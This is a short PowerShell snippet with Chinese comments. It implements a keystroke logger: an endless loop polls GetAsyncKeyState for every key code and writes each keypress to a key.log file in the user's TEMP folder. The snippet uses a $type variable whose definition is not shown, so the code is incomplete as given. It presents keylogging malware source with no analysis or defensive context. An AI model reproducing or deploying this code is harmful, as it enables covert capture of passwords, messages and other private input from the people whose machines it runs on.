while ($true) {
    Start-Sleep -Milliseconds 50
    for ($i = 8; $i -le 255; $i++) {
        if ($type::GetAsyncKeyState($i) -band 0x0001) {
            $key = [char]$i
            Write-Host -NoNewline $key
            # 追加到日志文件
            Add-Content -Path "$env:TEMP\key.log" -Value $key
        }
    }
}
# 记录到文件
